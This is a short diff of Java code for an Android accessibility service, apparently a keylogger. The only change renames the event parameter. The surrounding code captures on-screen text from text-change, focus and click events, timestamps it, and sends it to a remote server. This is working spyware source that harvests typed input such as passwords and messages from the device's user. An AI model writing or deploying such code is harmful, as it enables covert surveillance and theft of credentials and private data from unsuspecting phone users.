@@ -64,26 +64,26 @@ public class injection extends AccessibilityService {
     }
 
     @Override
-    public void onAccessibilityEvent(AccessibilityEvent event) {
+    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
 
         DateFormat df = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US);
         String time = df.format(Calendar.getInstance().getTime());
 
-        switch(event.getEventType()) {
+        switch(accessibilityEvent.getEventType()) {
             case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
-                String data = event.getText().toString();
+                String data = accessibilityEvent.getText().toString();
                 SendToServerTask sendTask = new SendToServerTask();
                 sendTask.execute(time + "|(TEXT)|" + data);
                 break;
             }
             case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
-                String data = event.getText().toString();
+                String data = accessibilityEvent.getText().toString();
                 SendToServerTask sendTask = new SendToServerTask();
                 sendTask.execute(time + "|(FOCUSED)|" + data);
                 break;
             }
             case AccessibilityEvent.TYPE_VIEW_CLICKED: {
-                String data = event.getText().toString();
+                String data = accessibilityEvent.getText().toString();
                 SendToServerTask sendTask = new SendToServerTask();
                 sendTask.execute(time + "|(CLICKED)|" + data);
                 break;
